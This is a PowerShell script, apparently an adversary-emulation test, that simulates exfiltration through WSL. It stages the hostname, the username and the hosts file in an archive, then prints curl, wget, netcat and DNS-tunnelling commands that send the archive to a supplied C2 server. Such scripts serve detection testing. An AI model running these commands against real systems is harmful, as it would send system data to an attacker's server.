param(
    [Parameter(Mandatory=$true)]
    [string]$C2Host,
    
    [Parameter(Mandatory=$false)]
    [int]$C2Port = 8080
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting WSL Exfiltration via Linux Tools..." -ForegroundColor Cyan

# T1048 - Exfiltration Over Alternative Protocol
# T1567 - Exfiltration Over Web Service
# Using Linux tools (curl, wget) within WSL for data exfiltration

Write-Host "[*] [T1048] Preparing data exfiltration via WSL..."
Write-Host "[!] Target C2 Server: http://$C2Host`:$C2Port" -ForegroundColor Yellow

# Check available exfiltration tools
Write-Host "`n[*] Checking available exfiltration tools in WSL..."
$curlCheck = wsl.exe which curl 2>&1
$wgetCheck = wsl.exe which wget 2>&1
$ncCheck = wsl.exe which nc 2>&1

if ($curlCheck -match "curl") { Write-Host "[+] curl available: $curlCheck" -ForegroundColor Green }
if ($wgetCheck -match "wget") { Write-Host "[+] wget available: $wgetCheck" -ForegroundColor Green }
if ($ncCheck -match "nc") { Write-Host "[+] netcat available: $ncCheck" -ForegroundColor Green }

# Prepare exfiltration payload (simulated sensitive data)
Write-Host "`n[*] Preparing data payload for exfiltration..."
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
wsl.exe bash -c "mkdir -p /tmp/exfil_staging"

# Collect simulated sensitive data
Write-Host "[*] Collecting system information..."
wsl.exe bash -c "hostname > /tmp/exfil_staging/sysinfo.txt"
wsl.exe bash -c "whoami >> /tmp/exfil_staging/sysinfo.txt"
wsl.exe bash -c "cat /mnt/c/Windows/System32/drivers/etc/hosts >> /tmp/exfil_staging/sysinfo.txt 2>/dev/null"

# Package data
Write-Host "[*] Packaging data for exfiltration..."
wsl.exe bash -c "tar czf /tmp/exfil_data_$timestamp.tar.gz -C /tmp/exfil_staging . 2>/dev/null"
Write-Host "[+] Data packaged: /tmp/exfil_data_$timestamp.tar.gz" -ForegroundColor Green

# Show exfiltration commands (simulation - does not actually send)
Write-Host "`n[*] Exfiltration commands that would be executed:" -ForegroundColor Cyan

Write-Host "`n[curl POST]:" -ForegroundColor Magenta
Write-Host "    curl -X POST -F 'file=@/tmp/exfil_data.tar.gz' http://$C2Host`:$C2Port/upload"

Write-Host "`n[wget]:" -ForegroundColor Magenta
Write-Host "    wget --post-file=/tmp/exfil_data.tar.gz http://$C2Host`:$C2Port/upload"

Write-Host "`n[netcat]:" -ForegroundColor Magenta
Write-Host "    cat /tmp/exfil_data.tar.gz | nc $C2Host $C2Port"

Write-Host "`n[base64 over DNS]:" -ForegroundColor Magenta
Write-Host "    base64 /tmp/exfil_data.tar.gz | xargs -I{} nslookup {}.exfil.$C2Host"

# Simulation marker
Write-Host "`n[*] [SIMULATION] Creating exfiltration marker..."
wsl.exe bash -c "echo 'Exfil simulation completed at $timestamp to $C2Host`:$C2Port' > /tmp/exfil_marker.txt"
wsl.exe cat /tmp/exfil_marker.txt

# Cleanup staging
Write-Host "`n[*] Cleaning up staging directory..."
wsl.exe rm -rf /tmp/exfil_staging

Write-Host "`n[+] WSL Exfiltration Setup Complete (Simulation Mode)." -ForegroundColor Green
